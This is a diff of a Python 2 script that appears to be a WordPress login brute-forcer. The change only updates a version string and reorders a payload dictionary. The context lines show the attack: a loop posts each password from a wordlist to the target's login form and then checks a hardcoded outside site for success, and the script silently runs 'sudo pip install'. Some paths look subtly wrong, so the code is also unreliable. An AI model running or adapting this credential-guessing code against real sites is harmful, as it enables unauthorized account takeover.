@@ -18,7 +18,7 @@ except:
 	os.system("sudo pip install requests")
 
 def title():
-	version = "0.01"
+	version = "1.00"
 	print"\n\n"
 	print "--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*--*\n"
 	print "|      |  ______   |                  |\\      /|       /\      ______ "
@@ -143,7 +143,7 @@ def brute_login(tgt, dictionary):
 	for word in f.readlines():
 		password = word.strip('\n')
 		intent+=1
-		payload = {'log': user, 'pwd': password, 'redirect_to': tgt+'/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
+		payload = {'log': user, 'pwd': password, 'redirect_to': tgt+'/wp_admin/', 'wp-submit': 'Acceder', 'testcookie': '1'}
 		print '[+] Trying with user: '+str(user)+' and password: '+str(password)+'\ttry: '+str(intent)
 		s.post(tgt+"/wp-login", data=payload)
 		data = s.get("http://gerion.info/wp-admin").text
